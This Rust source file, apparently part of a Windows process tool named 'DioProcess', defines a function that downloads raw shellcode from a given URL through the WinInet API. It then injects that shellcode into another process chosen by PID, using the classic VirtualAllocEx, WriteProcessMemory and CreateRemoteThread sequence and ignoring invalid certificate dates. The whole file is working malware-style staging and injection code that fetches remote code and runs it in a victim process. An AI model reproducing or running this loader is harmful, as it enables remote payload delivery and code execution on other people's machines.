use windows::core::PCWSTR;
use windows::Win32::Networking::WinInet::{
    InternetCloseHandle, InternetOpenUrlW, InternetOpenW, InternetReadFile,
    INTERNET_FLAG_HYPERLINK, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
};

use crate::error::MiscError;

use super::classic::inject_shellcode_bytes;

/// Download shellcode from a URL using WinInet and inject into a target process.
///
/// Uses `InternetOpenW` -> `InternetOpenUrlW` -> `InternetReadFile` (chunked)
/// to fetch raw shellcode bytes, then injects via the classic technique
/// (`VirtualAllocEx` -> `WriteProcessMemory` -> `VirtualProtectEx` -> `CreateRemoteThread`).
///
/// # Arguments
/// * `pid` - Target process ID
/// * `url` - URL to download raw shellcode from (HTTP or HTTPS)
pub fn inject_shellcode_url(pid: u32, url: &str) -> Result<(), MiscError> {
    let shellcode = download_shellcode(url)?;
    inject_shellcode_bytes(pid, &shellcode)
}

/// Download raw bytes from a URL using WinInet API.
fn download_shellcode(url: &str) -> Result<Vec<u8>, MiscError> {
    let wide_user_agent: Vec<u16> = "DioProcess\0".encode_utf16().collect();
    let wide_url: Vec<u16> = url.encode_utf16().chain(std::iter::once(0)).collect();

    unsafe {
        // Open internet session (INTERNET_OPEN_TYPE_PRECONFIG = 0)
        let h_internet = InternetOpenW(
            PCWSTR(wide_user_agent.as_ptr()),
            0,
            PCWSTR::null(),
            PCWSTR::null(),
            0,
        );

        if h_internet.is_null() {
            return Err(MiscError::WebStagingFailed(
                "InternetOpenW failed".to_string(),
            ));
        }

        // Open URL
        let h_url = InternetOpenUrlW(
            h_internet,
            PCWSTR(wide_url.as_ptr()),
            None,
            INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
            0,
        );

        if h_url.is_null() {
            let _ = InternetCloseHandle(h_internet);
            return Err(MiscError::WebStagingFailed(format!(
                "InternetOpenUrlW failed for: {}",
                url
            )));
        }

        // Read payload in 1024-byte chunks
        let mut payload: Vec<u8> = Vec::new();
        let mut tmp_buffer = [0u8; 1024];
        let mut bytes_read: u32 = 0;

        loop {
            let read_result = InternetReadFile(
                h_url,
                tmp_buffer.as_mut_ptr() as *mut _,
                tmp_buffer.len() as u32,
                &mut bytes_read,
            );

            if read_result.is_err() {
                let _ = InternetCloseHandle(h_url);
                let _ = InternetCloseHandle(h_internet);
                return Err(MiscError::WebStagingFailed(
                    "InternetReadFile failed".to_string(),
                ));
            }

            if bytes_read == 0 {
                break;
            }

            payload.extend_from_slice(&tmp_buffer[..bytes_read as usize]);

            if bytes_read < 1024 {
                break;
            }
        }

        let _ = InternetCloseHandle(h_url);
        let _ = InternetCloseHandle(h_internet);

        if payload.is_empty() {
            return Err(MiscError::WebStagingFailed(
                "Downloaded payload is empty".to_string(),
            ));
        }

        Ok(payload)
    }
}
